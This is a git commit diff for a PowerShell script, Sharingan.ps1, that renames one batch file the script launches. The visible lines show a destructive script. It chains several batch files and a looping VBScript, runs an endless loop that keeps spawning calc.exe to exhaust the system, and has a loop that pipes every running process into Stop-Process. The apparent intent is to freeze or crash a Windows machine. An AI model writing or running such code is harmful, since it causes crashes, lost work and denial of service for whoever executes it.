68a2bb978a4b985ab6a0d1042f0dc0877a10bfb6
GH05T HUNTER5 <108191615+GH05T-HUNTER5@users.noreply.github.com>
2023-04-26 11:40:21 +0530

    Update Sharingan.ps1

--- Sharingan.ps1
+++ Sharingan.ps1
@@ -4,7 +4,7 @@ Start-Process -FilePath ".\intermini.bat" -Wait
 Start-Process -FilePath ".\Dcube.bat" -Wait
 Start-Process -FilePath ".\Psycho.bat" -Wait
 Start-Process -FilePath ".\Drive.bat" -Wait
-Start-Process -FilePath ".\Endless.bat" -Wait
+Start-Process -FilePath ".\End.bat" -Wait
 Start-Process -FilePath "cscript.exe" -ArgumentList "looploop.vbs"
 while($true){Start-Process -FilePath "calc.exe"}
 for(){Get-Process | Stop-Process}
